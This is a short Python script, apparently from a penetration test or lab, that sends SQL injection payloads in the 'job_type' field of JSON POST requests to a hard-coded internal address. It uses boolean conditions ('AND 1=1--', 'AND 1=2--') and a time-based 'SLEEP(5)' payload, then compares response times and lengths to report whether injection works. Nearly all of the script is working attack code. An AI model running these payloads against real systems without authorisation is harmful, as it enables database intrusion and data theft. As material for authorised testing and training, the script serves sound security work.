import requests
import time

TARGET_URL = "http://10.0.162.112:80/jobs"
HEADERS = {"Content-Type": "application/json"}

def send_request(payload):
    data = {"job_type": payload}
    try:
        start_time = time.time()
        response = requests.post(TARGET_URL, json=data, headers=HEADERS, timeout=15)
        end_time = time.time()
        elapsed_time = end_time - start_time
        return elapsed_time, len(response.content), response.status_code
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for payload '{payload}': {e}")
        return None, None, None

def main():
    payloads = {
        "Baseline": "back-end",
        "True Condition": "back-end' AND 1=1--",
        "False Condition": "back-end' AND 1=2--",
        "Time Based (SLEEP 5)": "back-end' AND SLEEP(5)--"
    }
    
    results = {}
    
    print("[*] Starting SQL Injection testing...\n")
    
    for name, payload in payloads.items():
        elapsed_time, length, status = send_request(payload)
        results[name] = {
            "time": elapsed_time,
            "length": length,
            "status": status
        }
        print(f"[*] Testing: {name}")
        print(f"    Payload : {payload}")
        print(f"    Time    : {elapsed_time:.2f}s" if elapsed_time is not None else "    Time    : N/A")
        print(f"    Length  : {length}" if length is not None else "    Length  : N/A")
        print(f"    Status  : {status}\n" if status is not None else "    Status  : N/A\n")
        
    print("[*] Analysis Results:")
    
    baseline_time = results.get("Baseline", {}).get("time", 0) or 0
    time_based_time = results.get("Time Based (SLEEP 5)", {}).get("time", 0) or 0
    
    if time_based_time - baseline_time >= 4.0:
        print("[+] Time-Based SQL Injection DETECTED!")
        print(f"    Baseline time: {baseline_time:.2f}s | SLEEP(5) time: {time_based_time:.2f}s")
    else:
        print("[-] Time-Based SQL Injection NOT detected.")
        print(f"    Baseline time: {baseline_time:.2f}s | SLEEP(5) time: {time_based_time:.2f}s")
        
    baseline_len = results.get("Baseline", {}).get("length", 0) or 0
    true_len = results.get("True Condition", {}).get("length", 0) or 0
    false_len = results.get("False Condition", {}).get("length", 0) or 0
    
    if true_len != 0 and false_len != 0:
        if true_len == baseline_len and false_len != baseline_len:
            print("[+] Boolean-Based SQL Injection DETECTED!")
            print(f"    Baseline length: {baseline_len} | True length: {true_len} | False length: {false_len}")
        elif true_len != false_len:
            print("[!] Potential Boolean-Based SQL Injection (Lengths differ between True and False conditions).")
            print(f"    True length: {true_len} | False length: {false_len}")
        else:
            print("[-] Boolean-Based SQL Injection NOT detected (Lengths are identical).")

if __name__ == "__main__":
    main()